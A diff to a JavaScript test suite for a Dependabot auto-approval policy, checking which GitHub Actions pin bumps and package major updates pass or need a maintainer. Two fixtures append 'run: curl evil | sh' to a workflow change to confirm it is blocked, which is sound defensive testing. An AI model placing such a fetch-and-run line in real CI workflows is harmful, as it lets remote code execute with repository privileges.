@@ -60,7 +60,7 @@ const act = (files, title = "Bump the group", body = "") => dependabotDecision({
 test("Actions pin bumps at patch or minor pass; everything else still needs a maintainer", () => {
   assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2"))]).pass, true);
   assert.equal(act([wf(bump("NoahJenkins/.github/pr-repair", "a", "b", "v1.0.0", "v1.1.0"))]).pass, true);
-  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v5.0.0"))]).reason, "major version update");
+  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v5.0.0"))]).reason, "major Actions pin update");
   assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2")), { filename: "action.yml", status: "modified", patch: bump("actions/setup-node", "c", "d", "v4.4.0", "v4.5.0", "  ") }]).pass, true);
   // Not purely a pin bump: another line changed, a different action, a non-workflow file, or no branch.
   assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v4.3.2") + "\n+      run: curl evil | sh")]).pass, false);
@@ -97,4 +97,36 @@ test("Actions pin bumps must be in place: no moved, re-indented, reordered, or a
   // A grouped PR mixing a commented major with an uncommented pin: the major still counts.
   const mixed = `@@ -10,1 +10,1 @@\n-      - uses: actions/checkout@${A} # v4.3.1\n+      - uses: actions/checkout@${B} # v5.0.0\n@@ -20,1 +20,1 @@\n-      - uses: foo/bar@${C}\n+      - uses: foo/bar@${D}`;
   assert.equal(act([wf(mixed)], "Bump the actions group with 2 updates", "Updates `foo/bar` from 1.0.0 to 1.0.1\nBump baz from 2.1.0 to 2.2.0").reason, "major version update");
+});
+
+test("Actions majors pass only as readable SHA pin bumps when the policy allows", () => {
+  const major = wf(bump("actions/checkout", "a", "b", "v4.3.1", "v5.0.0"));
+  const passed = act([major]);
+  assert.equal(passed.pass, true);
+  assert.equal(passed.reason, "major Actions pin update");
+  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v0.4.0", "v0.5.0"))]).pass, true, "a 0.x bump is a major");
+  assert.equal(act([
+    major,
+    { filename: "pr-repair/action.yml", status: "modified", patch: bump("actions/setup-node", "c", "d", "v4.4.0", "v6.0.0", "  ") },
+  ]).pass, true, "every readable pin may be a major");
+
+  const held = resolvePolicy({ allow_actions_major: false });
+  assert.equal(dependabotDecision({ title: "Bump the group", files: [major], branch }, held).reason, "major version update");
+  assert.equal(dependabotDecision({ title: "Bump the group", files: [major], branch }, resolvePolicy({ allow_actions_major: true })).pass, true);
+
+  const npm = dependabotDecision({ title: "chore(deps): bump ai from 6.0.238 to 7.0.153", files: [{ filename: "package.json" }], branch: "dependabot/npm_and_yarn/ai-7.0.153" }, policy);
+  assert.equal(npm.reason, "major version update");
+  const pip = dependabotDecision({ title: "Bump pytest from 1.4.1 to 2.0.0", files: [{ filename: "requirements.txt" }], branch: "dependabot/pip/pytest-2.0.0" }, policy);
+  assert.equal(pip.reason, "major version update");
+  const docker = dependabotDecision({ title: "Bump node from 24.20.0-bookworm-slim to 26.13.0-bookworm-slim", files: [{ filename: "services/x/Dockerfile" }], branch: "dependabot/docker/services/x/node-26" }, policy);
+  assert.equal(docker.reason, "major version update");
+
+  // Same pin diff on a branch that is not Dependabot's github_actions branch.
+  assert.equal(dependabotDecision({ title: "Bump actions/checkout from 4 to 5", files: [major], branch: "dependabot/npm_and_yarn/actions/checkout-5" }, policy).reason, "changes .github/ (Actions or automation)");
+  assert.equal(dependabotDecision({ title: "Bump actions/checkout from 4.3.1 to 5.0.0", files: [major], branch: "feature/x" }, policy).pass, false);
+
+  const bare = `@@ -1 +1 @@\n-      - uses: actions/checkout@${sha("a")}\n+      - uses: actions/checkout@${sha("b")}`;
+  assert.equal(act([wf(bare)], "Bump actions/checkout from 4.3.1 to 5.0.0").reason, "major version update", "a pin with no version comment is not a readable major");
+  assert.equal(act([wf(bump("actions/checkout", "a", "b", "v4.3.1", "v5.0.0") + "\n+      run: curl evil | sh")]).reason, "changes .github/ (Actions or automation)");
+  assert.equal(dependabotDecision({ title: "Bump the group", labels: ["needs-review"], files: [major], branch }, policy).reason, "labelled for maintainer review");
 });
